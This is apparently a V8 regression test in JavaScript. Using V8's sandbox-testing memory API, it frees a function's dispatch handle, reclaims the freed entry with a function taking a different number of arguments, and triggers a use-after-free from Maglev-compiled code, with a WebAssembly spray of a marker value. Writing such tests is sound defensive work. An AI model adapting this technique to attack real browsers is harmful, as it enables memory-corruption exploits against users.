// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --expose-gc --sandbox-testing

const kHeapObjectTag = 1;
const kDispatchHandleOffset = Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdFor("JS_FUNCTION"), "dispatch_handle");

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const nuke_handle_from_heap_and_hope_nothing_important_is_gone = (dispatch_handle) => {
  for (let i = 0x40000; i < 0xc0000; i += 4) {
    if (memory.getUint32(i, true) === dispatch_handle) memory.setUint32(i, 0, true);
  }
  for (let i = 0x100000; i < 0x140000; i += 4) {
    if (memory.getUint32(i, true) === dispatch_handle) memory.setUint32(i, 0, true);
  }
}

// From test/mjsunit/sandbox/regress-430960844.js.
let spray_mod = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 24, 2, 96, 16, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 0, 96, 1, 126, 0, 2, 15, 1, 2, 106, 115, 8, 115, 112, 114, 97, 121, 95, 99, 98, 0, 0, 3, 2, 1, 1, 7, 9, 1, 5, 115, 112, 114, 97, 121, 0, 1, 10, 38, 1, 36, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 16, 0, 11]));
let { spray } = new WebAssembly.Instance(spray_mod, { js: { spray_cb: () => { } } }).exports;

// Get a clean slate.
gc({type: "major"});

// This thing's dispatch handle will be uaf'd.
const victim = eval("() => {}");

const maglev = () => {
  // Victim below will be called using its dispatch handle which at the time of
  // Maglev compilation will take no args per its dispatch entry.
  victim();
  spray(0x424242424242n);
};
%PrepareFunctionForOptimization(maglev);
maglev();
%OptimizeMaglevOnNextCall(maglev);
maglev();

// Remove all heap references to victim and trigger gc to free the handle.
const dispatch_handle = memory.getUint32(Sandbox.getAddressOf(victim) + kDispatchHandleOffset, true);
nuke_handle_from_heap_and_hope_nothing_important_is_gone(dispatch_handle);
gc({type: "major"});

// Reclaim the victim dispatch entry with a different arg count.
const victim_alias = eval("(a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14) => {}");
%PrepareFunctionForOptimization(victim_alias);
victim_alias();
%OptimizeFunctionOnNextCall(victim_alias);
victim_alias();
spray(0x424242424242n);
maglev();
